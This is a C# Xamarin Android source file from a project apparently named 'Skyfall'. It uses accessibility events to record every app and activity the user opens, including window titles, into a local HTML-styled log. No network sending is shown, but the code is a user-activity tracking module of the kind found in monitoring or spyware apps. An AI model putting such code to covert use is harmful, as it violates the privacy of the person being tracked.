/// 1.5 Revision: OK
using Android.AccessibilityServices;
using Android.Content;
using Android.Content.PM;
using Android.Media;
using Android.Views.Accessibility;
using System;
using System.Collections.Generic;

namespace Skyfall
{
    static class ActivityDriver
    {
        private static ActivityInfo activityInfo = null;
        private static string windowTitle = string.Empty;
        private static string applicationLabel = string.Empty;
        private static string lastActivity = string.Empty;

        public static void CaptureActivity(AccessibilityEvent ev)
        {
            if (ev.PackageName != null && ev.ClassName != null)
            {
                try
                {
                    ComponentName componentName = new ComponentName(ev.PackageName, ev.ClassName);
                    activityInfo = Kernel.applicationContext.PackageManager.GetActivityInfo(componentName, 0);
                    if ((activityInfo != null) && (componentName.FlattenToShortString() != lastActivity))
                    {
                        lastActivity = componentName.FlattenToShortString();

                        try { applicationLabel = activityInfo.LoadLabelFormatted(Kernel.applicationContext.PackageManager).ToString(); } catch (Exception e) { _ = Kernel.Beep(Tone.CdmaSoftErrorLite); Disk.LogException(e); }

                        Disk.LogMessage(ref Disk.stateWriter, "<span style=\"color:hotpink\"><strong>" + applicationLabel + "</strong> [" + windowTitle + "] [" + componentName.ClassName + "]</span>");
                    }
                }
                catch { /* Do NOT log here*/  }
            }
        }

        public static void CaptureTitle(AccessibilityEvent ev)
        {
            if ((ev.WindowChanges == WindowsChange.Active) && (ev.Source.Window.Type == AccessibilityWindowType.Application))
            {
                windowTitle = ev.Source.Window.Title;
            }
        }
    }
}